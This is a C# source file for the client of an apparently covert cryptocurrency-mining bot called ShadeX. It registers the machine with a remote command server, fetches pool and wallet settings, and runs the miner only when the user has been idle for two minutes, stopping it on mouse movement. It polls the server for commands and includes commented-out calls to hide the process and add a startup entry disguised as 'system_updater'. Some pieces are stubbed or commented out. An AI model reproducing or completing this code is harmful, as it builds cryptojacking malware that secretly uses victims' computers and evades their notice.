using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using ShadeX_Core;

namespace ShadeX_Client
{
    class Program
    {
        private static ShadeApi api;
        private static ConnectionHandler connectionHandler;
        private static ConfigFile config;
        private static Miner miner;
        private static Stopwatch stopwatch_miner;
        private static UserInput userInput;
        private static bool firstConnection = true;
        private static bool initDone = false;

        private static string device_id;
        static void Main(string[] args)
        {
            /* Connection Handler */
            //connectionHandler = new ConnectionHandler(@"http://shadex.5v.pl/");
            connectionHandler = new ConnectionHandler(@"http://localhost/");
            connectionHandler.GetConnection += connectionHandler_GetConnection;
            connectionHandler.LoseConnection += connectionHandler_LoseConnection;

            /* User Input */
            userInput = new UserInput();
            userInput.MouseTouch += UserInput_MouseTouch;
            userInput.StartListener();

            /* Miner */
            stopwatch_miner = new Stopwatch();
            stopwatch_miner.Start();

            /* Api */
            api = new ShadeApi(connectionHandler);

            /* Config */
            config = new ConfigFile("config.cfg");

            /* Hide */
            //Ninja.Hide();
            //Ninja.AddStartup("system_updater", AppDomain.CurrentDomain.BaseDirectory);

            initDone = true;
        }

        private static void UserInput_MouseTouch()
        {
            while (!initDone) { Thread.Sleep(100); }
            while (miner == null) { Thread.Sleep(100); }

            if (miner.isRunning)
            {
                miner.Stop();
                stopwatch_miner.Restart();
            }
        }

        private static void connectionHandler_LoseConnection()
        {
            while (!initDone) { Thread.Sleep(100); }
            Console.WriteLine("Disconnected!");
        }

        private static void connectionHandler_GetConnection()
        {
            while (!initDone) { Thread.Sleep(100); }

            Console.WriteLine("Connected to server. ");

            if(firstConnection)
            {
                
                if (device_id == null)
                {
                    device_id = config.GetValue("device_id");
                    if (device_id == string.Empty)
                    {
                        /* CREATE NEW DEVICE */
                        Random rand = new Random();
                        for (int i = 0; i < 9; i++) { device_id += rand.Next(9); }
                        while (!api.CreateNewDevice(device_id)) { Thread.Sleep(1000); }

                        Console.WriteLine("New Device Created: " + device_id);
                    }
                }
                config.Update(api.GetConfigFile(device_id));
                config.Update("device_id", device_id);

                Console.WriteLine(device_id);
            }

            miner = new Miner(
                config.GetValue("miner_file"),
                config.GetValue("port"),
                config.GetValue("pool_adress"),
                config.GetValue("wallet_adress"),
                false,
                false
                );

            api.UpdateOnlineStatusTime(device_id);

            new Thread(delegate() {

                while (connectionHandler.connected)
                {
                    /* Waiting for run miner */
                    if(stopwatch_miner.Elapsed.Minutes > 2)
                    { 
                        if(!miner.isRunning)
                        {
                            Console.WriteLine("MINER URUCHOMINY");
                            //miner.Start();
                        }
                    }

                    DeviceCommand command = api.GetCommandToExecute(device_id);
                    if(command != DeviceCommand.Empty)
                    {
                        // executing next available command
                    }
                    Thread.Sleep(1000);
                }
            }).Start();
        }
    }
}
